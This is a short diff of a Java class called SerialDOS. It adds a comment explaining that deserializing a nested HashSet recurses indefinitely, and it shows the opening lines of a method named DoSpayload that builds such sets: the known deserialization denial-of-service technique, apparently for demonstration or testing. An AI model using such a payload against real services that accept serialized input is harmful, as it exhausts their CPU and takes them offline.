@@ -44,6 +44,7 @@ public class SerialDOS {
     return new ObjectInputStream(new ByteArrayInputStream(bytes)).readObject();
   }
 
+  // Deserializing the HashSet will recurse indefinitely, consuming CPU
   static byte[] DoSpayload() throws IOException {
     Set<Object> root = new HashSet<>();
     Set<Object> s1 = root;
